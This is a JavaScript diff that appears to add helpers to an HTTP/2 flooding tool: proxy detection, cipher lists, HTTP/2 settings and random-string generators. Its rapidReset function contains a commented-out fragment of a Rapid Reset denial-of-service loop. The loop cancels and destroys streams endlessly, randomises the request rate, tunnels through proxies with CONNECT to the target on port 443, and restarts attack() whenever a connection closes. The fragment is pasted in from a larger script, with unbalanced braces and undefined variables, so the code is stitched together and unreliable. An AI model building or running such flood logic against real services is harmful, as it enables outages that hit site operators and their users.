+function detectProxyProtocol(proxy) {
+    if (proxy.startsWith("http")) {
+        return "http";
+    } else if (proxy.startsWith("socks")) {
+        return "socks5";
+    }
+    return "unknown";
+}
+
+function debugDataFrame(data) {
+    if (debug) {
+        console.log("调试数据: ", data);
+    }
+}
+
+function rapidReset() {
+    console.log("触发快速重置...");
+    /*
+    if (enabled('reset')) {
+                            (async () => {
+                                while (true) {
+                                    await new Promise(resolve => setTimeout(resolve, random_int(1000, 2000)));
+                                    await req.close(http2.constants.NGHTTP2_CANCEL);
+                                    await req.end()
+
+                                    await client.destroy();
+                                }
+                            })();
+                        }
+                    }
+
+                    let _rate;
+                    if (enabled('randrate')) {
+                        _rate = random_int(1, 90);
+                    } else {
+                        _rate = rate;
+                    }
+                    setTimeout(() => {
+                        request();
+                    }, 1000 / _rate);
+                }
+                request();
+            }).on('error', (err) => {
+                if (err.code === "ERR_HTTP2_GOAWAY_SESSION" || err.code === "ECONNRESET" || err.code == "ERR_HTTP2_ERROR") {
+                    client.close();
+                }
+            });
+        }).on('error', () => {
+            tls_conn.destroy();
+        });
+        socket.write(`CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
+    }).once('close', () => {
+        if (tls_conn) { tls_conn.end(() => { tls_conn.destroy(); attack(); }); }
+    });
+}
+    */
+}
+
+function updateCiphers() {
+    return [
+        "TLS_AES_128_GCM_SHA256",
+        "TLS_AES_256_GCM_SHA384",
+        "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
+    ];
+}
+
+function adaptiveHTTP2Settings() {
+    return {
+        maxConcurrentStreams: 100,
+        initialWindowSize: 65535,
+        headerTableSize: 4096
+    };
+}
+
+function generateRandomCharacters(length) {
+    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
+}
+
+function generateRandomStrings(n) {
+    let result = [];
+    for (let i = 0; i < n; i++) {
+        result.push(generateRandomCharacters(10));
+    }
+    return result;
+}
+
+function generateRandomNumbers(n) {
+    let result = [];
+    for (let i = 0; i < n; i++) {
+        result.push(Math.floor(Math.random() * 10000));
+    }
+    return result;
+}
